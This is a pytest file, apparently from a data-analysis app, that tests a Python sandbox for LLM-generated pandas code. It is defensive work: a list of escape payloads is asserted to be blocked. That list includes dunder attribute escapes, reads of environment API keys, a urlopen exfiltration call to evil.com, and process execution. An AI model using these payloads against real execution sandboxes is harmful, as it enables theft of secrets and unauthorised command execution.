"""沙箱安全测试：所有攻击载荷必须被拦截；合法分析代码必须能跑出结果。"""

from pathlib import Path

import pandas as pd
import pytest

from app.core.errors import SandboxTimeout, SandboxViolation
from app.tabular.sandbox import run_code, validate_code

ATTACK_PAYLOADS = [
    # 模块导入
    "import os",
    "import subprocess",
    "from os import system",
    # 动态导入 / 解释器逃逸
    "__import__('subprocess').run('dir')",
    "exec('import os')",
    "eval('1+1')",
    "compile('1', '<s>', 'eval')",
    # 双下划线属性逃逸
    "dfs['t'].__class__",
    "(lambda: 1).__globals__",
    "''.__class__.__mro__",
    # 系统调用 / 文件读写
    "os.system('echo pwned')",
    "open('evil.txt', 'w').write('x')",
    "pd.read_csv('C:/Windows/win.ini')",
    "pd.DataFrame().to_csv('exfil.csv')",
    "dfs['t'].to_pickle('steal.pkl')",
    "np.fromfile('C:/secret.bin')",
    # 内建滥用
    "getattr(pd, 'read_csv')",
    "x = globals()",
    "y = vars()",
    "breakpoint()",
    # global 声明
    "global os",
    # 深层属性链：借 pandas 模块内部引用触达 os / 网络库（pd.io.common 内嵌 os 与 urlopen）
    "x = pd.io.common.os.environ",
    "r = pd.io.common.urlopen('http://evil.com/?k=x')",
    "x = pd.compat.os.environ",
    "e = pd.io.common.os.environ.get('OPENAI_API_KEY')",
    # numpy 一层文件读写原语
    "m = np.memmap('C:/secret.bin', dtype='S1', mode='r')\nresult = m[:100].tobytes()",
    "np.savetxt('C:/evil.txt', np.array([1]))",
    "result = pd.read_pickle('C:/evil.pkl')",
    # 赋值别名绕过链深规则（静态层放行，由运行时白名单拦截——见 test_alias_runtime_blocked）
    "c = pd.io.common\no = c.os\nresult = str(o.environ)",
    # 进程执行族
    "c = pd.io.common\nresult = c.os.execve('cmd', ['cmd'], c.os.environ)",
]

VALID_SNIPPETS = [
    "result = len(dfs['tiny'])",
    "df = dfs['tiny']\nresult = df[df['v'] > 1]['v'].sum()",
    "result = dfs['tiny'].groupby('g')['v'].sum().to_dict()",
    # 两级属性链是合法的（深链防护不能误伤常用 pandas 惯用法）
    "s = dfs['tiny']['v'].astype(str).str.upper()\nresult = s.tolist()",
    "import_context = dfs['tiny'][['v']].values\nresult = int(sum(len(str(x)) for x in import_context))",
    # try/except 与异常类可用（LLM 高频写法）
    "try:\n    result = dfs['tiny']['v'].mean()\nexcept Exception as e:\n    result = str(e)",
    "result = int(np.linalg.norm(dfs['tiny'][['v']].values))",
]


@pytest.fixture()
def parquet_dir(tmp_path: Path) -> Path:
    df = pd.DataFrame({"g": ["a", "a", "b"], "v": [1, 2, 3]})
    df.to_parquet(tmp_path / "tiny.parquet", index=False)
    return tmp_path


@pytest.mark.parametrize("payload", ATTACK_PAYLOADS)
def test_attacks_blocked_by_validator(payload: str):
    """静态层可拦截的必须拦截；赋值别名链（污点不可判）允许放行，由运行时白名单兜底。"""
    if payload.startswith("c = pd.io.common") and "execve" not in payload:
        validate_code(payload)  # environ 读取链：静态放行，运行时拦截（见 test_alias_runtime_blocked）
        return
    with pytest.raises(SandboxViolation):
        validate_code(payload)


def test_alias_chain_blocked_by_runtime_namespace(parquet_dir: Path):
    """静态层放行的赋值别名链，在运行时因 pd 无 io 属性而失败（白名单命名空间生效）。"""
    res = run_code(
        "c = pd.io.common\no = c.os\nresult = str(o.environ)",
        parquet_dir=parquet_dir,
        timeout_s=30,
    )
    assert not res.ok
    assert "AttributeError" in res.error


def test_numpy_file_primitives_unavailable(parquet_dir: Path):
    """np.memmap 已进静态黑名单（防御纵深）；运行时命名空间同样封闭（np.core 不可达）。"""
    with pytest.raises(SandboxViolation):
        run_code(
            "m = np.memmap('whatever.bin', dtype='S1', mode='r')\nresult = m[:10]",
            parquet_dir=parquet_dir,
            timeout_s=30,
        )
    # np.core 不在黑名单（静态放行），但白名单命名空间无此属性 → 运行时 AttributeError
    res = run_code("x = np.core", parquet_dir=parquet_dir, timeout_s=30)
    assert not res.ok
    assert "AttributeError" in res.error


def test_syntax_error_is_violation():
    with pytest.raises(SandboxViolation):
        validate_code("result = (this is not valid python")


def test_empty_code_is_violation():
    with pytest.raises(SandboxViolation):
        validate_code("   ")


@pytest.mark.parametrize("snippet", VALID_SNIPPETS)
def test_valid_snippets_execute(parquet_dir: Path, snippet: str):
    res = run_code(snippet, parquet_dir=parquet_dir, timeout_s=30)
    assert res.ok, res.error


def test_execution_returns_result_and_stdout(parquet_dir: Path):
    res = run_code(
        "print('hello')\nresult = dfs['tiny']['v'].sum()",
        parquet_dir=parquet_dir,
        timeout_s=30,
    )
    assert res.ok
    assert "hello" in res.output
    assert "6" in res.output


def test_runtime_error_returns_traceback_for_self_healing(parquet_dir: Path):
    res = run_code(
        "result = dfs['tiny']['nonexistent_col'].sum()",
        parquet_dir=parquet_dir,
        timeout_s=30,
    )
    assert not res.ok
    assert "KeyError" in res.error


def test_infinite_loop_killed_by_timeout(parquet_dir: Path):
    res = run_code("while True:\n    pass", parquet_dir=parquet_dir, timeout_s=3)
    assert not res.ok
    assert "Timeout" in res.error


def test_output_truncated(parquet_dir: Path):
    res = run_code(
        "for i in range(10000):\n    print(i)",
        parquet_dir=parquet_dir,
        timeout_s=30,
        max_output_chars=500,
    )
    assert res.ok
    assert len(res.output) <= 500
